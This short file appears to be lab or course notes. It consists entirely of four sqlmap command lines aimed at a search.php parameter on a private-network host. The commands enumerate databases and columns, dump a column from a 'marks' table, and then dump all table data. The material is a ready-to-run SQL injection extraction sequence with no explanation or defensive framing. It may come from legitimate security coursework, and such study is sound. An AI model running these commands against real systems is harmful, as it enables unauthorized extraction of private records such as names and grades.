#Entry Point and get all dbs on this server
python sqlmap.py -u "http://192.168.1.9/ISAA/search.php?regno=19BCE0382" --dbs

#Column D for database
python sqlmap.py -u "http://192.168.1.9/ISAA/search.php?regno=19BCE0382" --dbs --columns -D isaa

# Get one Column
python sqlmap.py -u "http://192.168.1.9/ISAA/search.php?regno=19BCE0382" --dump -C NAME -T marks -D ISAA

# dump all table data
python sqlmap.py -u "http://192.168.1.9/ISAA/search.php?regno=19BCE0382" --dump-all -T marks -D isaa
